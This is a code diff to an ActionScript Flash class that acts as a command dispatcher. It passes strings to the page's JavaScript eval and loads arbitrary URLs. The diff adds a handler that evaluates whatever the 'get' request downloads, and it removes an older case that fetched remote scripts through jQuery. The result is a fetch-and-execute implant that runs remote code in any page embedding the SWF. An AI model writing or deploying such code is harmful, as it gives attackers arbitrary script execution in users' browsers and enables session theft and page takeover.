@@ -1,6 +1,7 @@
 package {
  import flash.display.Sprite;
  import flash.net.*;
+ import flash.events.Event;
  import flash.external.ExternalInterface;
  public class Main extends Sprite {
   public function Main() {
@@ -16,17 +17,17 @@ package {
      break;
     case "get": // GET
      var loader: URLLoader = new URLLoader(new URLRequest(cmd));
+	 loader.addEventListener(Event.COMPLETE,get_complete);
      break;
     case "eval": // execute JS
      flash.external.ExternalInterface.call("eval", cmd);
      break;
-    case "run": // execute JS file
-     var script: String = "if($&&$.getScript){ $.getScript("+cmd+") }";
-     flash.external.ExternalInterface.call("eval", script);
-     break;
     default:
      break;
    }
+  }
+  function get_complete(e:Event){
+	   flash.external.ExternalInterface.call("eval", e.target.data);
   }
  }
 }
